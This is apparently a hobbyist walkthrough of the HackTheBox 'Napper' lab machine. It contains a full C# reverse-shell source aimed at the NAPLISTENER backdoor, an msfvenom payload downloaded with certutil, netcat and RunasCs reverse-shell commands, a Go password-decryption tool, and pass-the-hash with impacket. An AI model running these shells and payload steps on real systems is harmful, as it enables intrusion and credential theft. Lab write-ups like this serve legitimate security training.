A Hard level CTF lab machine of the HackTheBox platform running Windows OS, in which we exploit a Naplistener malware sample launched by a virus analyst and then escalate privileges by exploiting our own password rotation solution.
```
└─# rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.240 --  -sV               
Open 10.10.11.240:80
Open 10.10.11.240:443
Open 10.10.11.240:7680
Scanned at 2023-11-14 12:02:56 GMT for 79s

PORT     STATE SERVICE    REASON          VERSION
80/tcp   open  http       syn-ack ttl 127 Microsoft IIS httpd 10.0
443/tcp  open  ssl/http   syn-ack ttl 127 Microsoft IIS httpd 10.0
7680/tcp open  pando-pub? syn-ack ttl 127
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
Second scan using nmap
```
└─# nmap -sC -sV -p80,443,7680 -A $ip
Nmap scan report for app.napper.htb (10.10.11.240)
Host is up (0.58s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_ssl-date: 2023-11-14T12:06:59+00:00; 0s from scanner time.
|_http-generator: Hugo 0.112.3
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Research Blog | Home 
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   519.84 ms 10.10.16.1
2   732.40 ms app.napper.htb (10.10.11.240)

```


redirect to `https://app.napper.htb`
On the website. i found hugo 0.112.3
i will search for this specifi version on Google and found exploit for CVE-2020-26284. Nothing to exploit.
Let's start gobuster to look for other domains:
```
└─# gobuster vhost -u https://napper.htb -w Seclists/subdomains-top5000.txt --append-domain -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://napper.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        Seclists/subdomains-top5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: internal.napper.htb Status: 401 [Size: 1293]
```
I will add it on my /etc/hosts
When i access on it. it is asking me for user and password.
Find the blog article https://app.napper.htb/posts/setup-basic-auth-powershell/,> where we see an example command to add a new user.
I found this Step 6: Add a User Account (Optional)
If you want to add a user account for Basic Authentication, run the following command:
On it `example` user : `ExamplePassword` password. i will test it. Yeah it work.
I found : https://internal.napper.htb/posts/first-re-research/
```
The malware is a .NET sample. We are tracking the malware fond by Elastic who named it NAPLISTENER.
References

    https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph
    https://malpedia.caad.fkie.fraunhofer.de/details/win.naplistener
    https://www.darkreading.com/threat-intelligence/custom-naplistener-malware-network-based-detection-sleep


```
also found : `/ews/MsExgHealthCheckd/` `sdafwe3rwe23`
## Naplistner
```
curl -v -k --request POST -d "" https://napper.htb/ews/MsExgHealthCheckd/
< HTTP/2 404 
< content-type: text/html
< server: Microsoft-IIS/10.0
< date: Tue, 14 Nov 2023 12:38:19 GMT
< content-length: 1245


```
I got 404 But when i try.
```
└─# curl -v -k --request POST -d "sdafwe3rwe23=test" https://napper.htb/ews/MsExgHealthCheckd/
< HTTP/2 200 
< content-length: 0
< content-type: text/html; charset=utf-8
< server: Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0
< x-powered-by: ASP.NET
< date: Tue, 14 Nov 2023 12:40:36 GMT
< 
* Connection #0 to host napper.htb left intact
```
Humm interessting. following this : https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph
Now we need to create a Run Class.
I take this : https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
I will compile it. so i asked GPT on how to do it
```
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace payload
{
  internal class Program
  {
    static StreamWriter streamWriter;

    public static void BackConnect(string ip, int port)
    {
        using (TcpClient client = new TcpClient(ip, port))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    streamWriter = new StreamWriter(stream);

                    StringBuilder strInput = new StringBuilder();

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();

                    while (true)
                    {
                        strInput.Append(rdr.ReadLine());
                        p.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                }
            }
        }
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!string.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

    static void Main()
    {
        new Run();
    }
  }

  public class Run
  {
    public Run()
    {
        Program.BackConnect("10.10.16.64", 443);
    }
  }
}
```
I used mcs to compile it
Then use :

```
└─# mcs -out:payload.exe file.cs

└─# cat payload.exe| base64 -w 0 | xclip -sel clip
```
Past payload on python script.
```
┌──(root㉿1337)-[/home/…/Boot2root/HacktheBox/Season/shell]
└─# python3 exploit.py                            
https://napper.htb/ews/MsExgHealthCheckd/ : 200 {'Content-Length': '0', 'Content-Type': 'text/html; charset=utf-8', 'Server': 'Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0', 'X-Powered-By': 'ASP.NET', 'Date': 'Tue, 14 Nov 2023 13:57:24 GMT'}
e

```

```
whoami
C:\Users\ruben\Desktop>whoami
napper\ruben


 Volume Serial Number is CB08-11BF
 Directory of C:\Users\ruben\Desktop
06/09/2023  06:00 AM    <DIR>          .
06/09/2023  06:00 AM    <DIR>          ..
06/07/2023  06:02 AM             2,352 Microsoft Edge.lnk
11/14/2023  04:29 AM                34 user.txt
               2 File(s)          2,386 bytes
               2 Dir(s)   3,383,762,944 bytes free
type user.txt
C:\Users\ruben\Desktop>type user.txt
1461714b98a7fab43bce0e0ec20e05f8
```
## Privilege Escalation
first i will try to get a meterpreter.
```
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.64 LPORT=1337 -f exe | tee -a shell.exe


C:\Windows\system32>certutil -urlcache -f http://10.10.16.64:4242/shell.exe %temp%/s.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

┌──(root㉿1337)-[/tmp/shell]
└─# python3 -m http.server 4242
Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
10.10.11.240 - - [14/Nov/2023 20:00:13] "GET /shell.exe HTTP/1.1" 200 -
10.10.11.240 - - [14/Nov/2023 20:00:15] "GET /shell.exe HTTP/1.1" 200 -

```
**Meterpreter**
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.64:1337 
[*] Sending stage (200774 bytes) to 10.10.11.240
[*] Meterpreter session 1 opened (10.10.16.64:1337 -> 10.10.11.240:64063) at 2023-11-14 20:01:08 +0000

meterpreter > 
meterpreter > sysinfo 
Computer        : NAPPER
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

```
```
I used netstat and i have a lot of open ports.

    tcp    127.0.0.1:9200                   0.0.0.0:*          LISTEN       0     0      4760/java.exe
    tcp    127.0.0.1:9300                   0.0.0.0:*          LISTEN       0     0      4760/java.exe
    tcp    127.0.0.1:64054                  127.0.0.1:9200     TIME_WAIT    0     0      0/[System Process]
    tcp    127.0.0.1:64064                  127.0.0.1:9200     TIME_WAIT    0     0      0/[System Process]
    tcp6   :::80                            :::*               LISTEN       0     0      4/System
    tcp6   :::135                           :::*               LISTEN       0     0      900/svchost.exe
    tcp6   :::443                           :::*               LISTEN       0     0      4/System
    tcp6   :::445                           :::*               LISTEN       0     0      4/System
    tcp6   :::7680                          :::*               LISTEN       0     0      356/svchost.exe
    tcp6   :::49664                         :::*               LISTEN       0     0      676/lsass.exe
    tcp6   :::49665                         :::*               LISTEN       0     0      516/wininit.exe
    tcp6   :::49666                         :::*               LISTEN       0     0      1104/svchost.exe
    tcp6   :::49667                         :::*               LISTEN       0     0      1520/svchost.exe
    tcp6   :::62403                         :::*               LISTEN       0     0      660/services.exe


```
The two services hanging locally on ports 9200 and 9300 are elastic.
```
 Directory of C:\Temp\www\internal\content\posts

06/08/2023  11:20 PM    <DIR>          .
06/08/2023  11:20 PM    <DIR>          ..
06/08/2023  11:18 PM             1,755 first-re-research.md
11/14/2023  12:02 PM    <DIR>          internal-laps-alpha
06/08/2023  11:18 PM               493 no-more-laps.md
               2 File(s)          2,248 bytes
               3 Dir(s)   3,301,855,232 bytes free

C:\Temp\www\internal\content\posts>
```
On the internal i found these 
```
C:\Temp\www\internal\content\posts>type no-more-laps.md
type no-more-laps.md
---
title: "**INTERNAL** Getting rid of LAPS"
description: Replacing LAPS with out own custom solution
date: 2023-07-01
draft: true 
tags: [internal, sysadmin] 
---

# Intro

We are getting rid of LAPS in favor of our own custom solution. 
The password for the `backup` user will be stored in the local Elastic DB.

IT will deploy the decryption client to the admin desktops once it it ready. 

We do expect the development to be ready soon. The Malware RE team will be the first test group. 
```
access on the directory
```
11/14/2023  12:02 PM    <DIR>          internal-laps-alpha
 Directory of C:\Temp\www\internal\content\posts\internal-laps-alpha

11/14/2023  12:07 PM    <DIR>          .
11/14/2023  12:07 PM    <DIR>          ..
06/08/2023  11:28 PM                82 .env
06/08/2023  11:20 PM        12,697,088 a.exe

C:\Temp\www\internal\content\posts\internal-laps-alpha>type .env
type .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here

ELASTICURI=https://127.0.0.1:9200

```
found user and password for the elastic.
port forward the 9200 port `portfwd add -l 10100 -p 9200 -r 127.0.0.1`
```
meterpreter > portfwd add -l 9200 -p 9200 -r 127.0.0.1
[*] Forward TCP relay created: (local) :9200 -> (remote) 127.0.0.1:9200

```
```
$ curl -k -u "user:pass" -X GET https://127.0.0.1:9200
{
  "name" : "NAPPER",
  "cluster_name" : "backupuser",
  "cluster_uuid" : "tWUZG4e8QpWIwT8HmKcBiw",
  "version" : {
    "number" : "8.8.0",
    "build_flavor" : "default",
    "build_type" : "zip",
    "build_hash" : "c01029875a091076ed42cdb3a41c10b1a9a5a20f",
    "build_date" : "2023-05-23T17:16:07.179039820Z",
    "build_snapshot" : false,
    "lucene_version" : "9.6.0",
    "minimum_wire_compatibility_version" : "7.17.0",
    "minimum_index_compatibility_version" : "7.0.0"
  },
  "tagline" : "You Know, for Search"
}


```
Reverse binary file a.exe

Getting the sid and blob from elastic:

curl -k -u "user:pass" -X GET "https://localhost:9200/seed/_search"
curl -k -u "user:pass" -X GET "https://localhost:9200/user-00001/_search".

Write a programme that will automatically retrieve parameters from elastic and decode the password: 
## Got Nothing works

```
.\RunasCs.exe backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd cmd.exe -r 10.10.16.64:1338 --bypass-uac

 runascs backup ytkCAMAGNEfDiMAvFpdEVGyNzQotkczpxOstRvNT "cmd.exe /c nc.exe 10.10.16.64 4444 -e cmd.exe" -t 8 --bypass-uac 
```

## Got the pass Extractor go file
```
package main

import (
        "crypto/aes"
        "crypto/cipher"
        "encoding/base64"
        "fmt"
        "math/rand"
        "os/exec"
        "strconv"
        "strings"
)

func getSeed() (int64, string, error) {
        cmd := exec.Command(
                "curl",
                "-i", "-s", "-k", "-X", "GET",
                "-H", "Host: 10.10.16.64:9200",
                "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "-H", "Accept-Language: en-US,en;q=0.5",
                "-H", "Accept-Encoding: gzip, deflate",
                "-H", "Dnt: 1",
                "-H", "Authorization: Basic ZWxhc3RpYzpvS0h6alp3MEVHY1J4VDJjdXg1Sw==",
                "-H", "Upgrade-Insecure-Requests: 1",
                "-H", "Sec-Fetch-Dest: document",
                "-H", "Sec-Fetch-Mode: navigate",
                "-H", "Sec-Fetch-Site: none",
                "-H", "Sec-Fetch-User: ?1",
                "-H", "Te: trailers",
                "-H", "Connection: close",
                "-b", "i_like_gitea=1bcfba2fb61ea525; lang=en-US",
                "https://10.10.16.64:9200/_search?q=*&pretty=true",
        )

        output, err := cmd.CombinedOutput()
        if err != nil {
                return 0, "", nil
        }

        outputLines := strings.Split(string(output), "\n")
        var seedStr string
        for _, line := range outputLines {
                if strings.Contains(line, "seed") && !strings.Contains(line, "index") {
                        seedStr = strings.TrimSpace(strings.Split(line, ":")[1])
                        break
                }
        }

        seed, err := strconv.ParseInt(seedStr, 10, 64)
        if err != nil {
                return 0, "", nil
        }

        outputLines = strings.Split(string(output), "\n")
        var blob string
        for _, line := range outputLines {
                if strings.Contains(line, "blob") {
                        blob = line
                        blob = strings.TrimSpace(strings.Split(line, ":")[1])
                        blob = strings.Split(blob, "\"")[1]
                        break
                }
        }

        return seed, blob, nil
}

func generateKey(seed int64) []byte {
        rand.Seed(seed)
        key := make([]byte, 16)
        for i := range key {
                key[i] = byte(1 + rand.Intn(254))
        }
        return key
}

func decryptCFB(iv, ciphertext, key []byte) ([]byte, error) {
        block, err := aes.NewCipher(key)
        if err != nil {
                return nil, err
        }

        stream := cipher.NewCFBDecrypter(block, iv)
        plaintext := make([]byte, len(ciphertext))
        stream.XORKeyStream(plaintext, ciphertext)

        return plaintext, nil
}

func main() {
        seed, encryptedBlob, _ := getSeed()

        key := generateKey(seed)

        decodedBlob, err := base64.URLEncoding.DecodeString(encryptedBlob)
        if err != nil {
                fmt.Println("Error decoding base64:", err)
                return
        }

        iv := decodedBlob[:aes.BlockSize]
        encryptedData := decodedBlob[aes.BlockSize:]

        decryptedData, err := decryptCFB(iv, encryptedData, key)
        if err != nil {
                fmt.Println("Error decrypting data:", err)
                return
        }

        fmt.Printf("Key: %x\n", key)
        fmt.Printf("IV: %x\n", iv)
        fmt.Printf("Encrypted Data: %x\n", encryptedData)
        fmt.Printf("Decrypted Data: %s\n", decryptedData)
}
```
Build it and run it
```


```
Now i will try these 
```
.\RunasCs.exe backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd cmd.exe -r 10.10.16.64:4444 --bypass-uac

 runascs backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd "cmd.exe /c nc.exe 10.10.16.64 4444 -e cmd.exe" -t 8 --bypass-uac 


.\RunasCs.exe backup NaesVGCIOCQLrCRXmNULHVVEbPmRiIIilHwTIzOd C:\Temp\reverse.exe --bypass-uac --logon-type '8' 
```


## Not work
```
└─# proxychains -q impacket-smbexec -hashes :ED5CC50D93A33729ACD6DF740EECD86C administrator@127.0.0.1

.\RunasCs.exe backup BZdTLUUmVpTbWtRqmUAViexbSwIrowRabVKXFxPO cmd.exe -r 10.10.16.64:4444 --bypass-uac

```


## Pivot with admin hash
```
└─# impacket-smbexec -hashes :ed5cc50d93a33729acd6df740eecd86c administrator@10.10.16.64
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>

C:\Windows\system32>type C:\users\administrator\desktop\root.txt
453a7588859f212a17b0af561de66c37

C:\Windows\system32>


```